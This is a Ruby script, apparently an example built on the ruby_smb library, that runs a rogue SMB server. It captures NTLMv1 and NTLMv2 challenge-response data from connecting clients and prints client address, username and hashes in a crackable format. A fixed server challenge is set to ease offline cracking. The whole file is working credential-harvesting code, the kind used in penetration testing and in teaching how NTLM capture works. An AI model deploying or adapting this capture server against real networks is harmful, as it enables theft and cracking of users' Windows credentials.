#!/usr/bin/ruby

require 'bundler/setup'
require 'optparse'
require 'ruby_smb'
require 'ruby_smb/gss/provider/ntlm'

# we just need *a* default encoding to handle the strings from the NTLM messages
Encoding.default_internal = 'UTF-8' if Encoding.default_internal.nil?

options = {
  smbv1: true,
  smbv2: true,
  smbv3: true
}
OptionParser.new do |opts|
  opts.banner = "Usage: #{File.basename(__FILE__)} [options]"
  opts.on("--[no-]smbv1", "Enabled or disable SMBv1 (default: #{options[:smbv1] ? 'Enabled' : 'Disabled'})") do |smbv1|
    options[:smbv1] = smbv1
  end
  opts.on("--[no-]smbv2", "Enabled or disable SMBv2 (default: #{options[:smbv2] ? 'Enabled' : 'Disabled'})") do |smbv2|
    options[:smbv2] = smbv2
  end
  opts.on("--[no-]smbv3", "Enabled or disable SMBv3 (default: #{options[:smbv3] ? 'Enabled' : 'Disabled'})") do |smbv3|
    options[:smbv3] = smbv3
  end
end.parse!

def bin_to_hex(s)
  s.each_byte.map { |b| b.to_s(16).rjust(2, '0') }.join
end

# this is a custom NTLM provider that will log the challenge and responses for offline cracking action!
class HaxorNTLMProvider < RubySMB::Gss::Provider::NTLM
  class Authenticator < RubySMB::Gss::Provider::NTLM::Authenticator
    # override the NTLM type 3 process method to extract all of the valuable information
    def process_ntlm_type3(type3_msg)
      username = "#{type3_msg.domain.encode}\\#{type3_msg.user.encode}"
      _, client = ::Socket::unpack_sockaddr_in(@server_client.getpeername)

      hash_type = nil
      hash = "#{type3_msg.user.encode}::#{type3_msg.domain.encode}"

      case type3_msg.ntlm_version
      when :ntlmv1
        hash_type = 'NTLMv1-SSP'
        hash << ":#{bin_to_hex(type3_msg.lm_response)}"
        hash << ":#{bin_to_hex(type3_msg.ntlm_response)}"
        hash << ":#{bin_to_hex(@server_challenge)}"
      when :ntlmv2
        hash_type = 'NTLMv2-SSP'
        hash << ":#{bin_to_hex(@server_challenge)}"
        # NTLMv2 responses consist of the proof string whose calculation also includes the additional response fields
        hash << ":#{bin_to_hex(type3_msg.ntlm_response[0...16])}"  # proof string
        hash << ":#{bin_to_hex(type3_msg.ntlm_response[16.. -1])}" # additional response fields
      end

      unless hash_type.nil?
        version = @server_client.metadialect.version_name
        puts "[#{version}] #{hash_type} Client   : #{client}"
        puts "[#{version}] #{hash_type} Username : #{username}"
        puts "[#{version}] #{hash_type} Hash     : #{hash}"
      end

      WindowsError::NTStatus::STATUS_ACCESS_DENIED
    end
  end

  def new_authenticator(server_client)
    # build and return an instance that can process and track stateful information for a particular connection but
    # that's backed by this particular provider
    Authenticator.new(self, server_client)
  end

  # we're overriding the default challenge generation routine here as opposed to leaving it random (the default)
  def generate_server_challenge(&block)
    "\x11\x22\x33\x44\x55\x66\x77\x88"
  end
end

# define a new server with the custom authentication provider
server = RubySMB::Server.new(
  gss_provider: HaxorNTLMProvider.new
)
server.dialects.select! { |dialect| RubySMB::Dialect[dialect].family != RubySMB::Dialect::FAMILY_SMB1 } unless options[:smbv1]
server.dialects.select! { |dialect| RubySMB::Dialect[dialect].family != RubySMB::Dialect::FAMILY_SMB2 } unless options[:smbv2]
server.dialects.select! { |dialect| RubySMB::Dialect[dialect].family != RubySMB::Dialect::FAMILY_SMB3 } unless options[:smbv3]

if server.dialects.empty?
  puts "at least one version must be enabled"
  exit false
end

puts "server is running"
server.run do
  puts "received connection"
  # accept all of the connections and run forever
  true
end
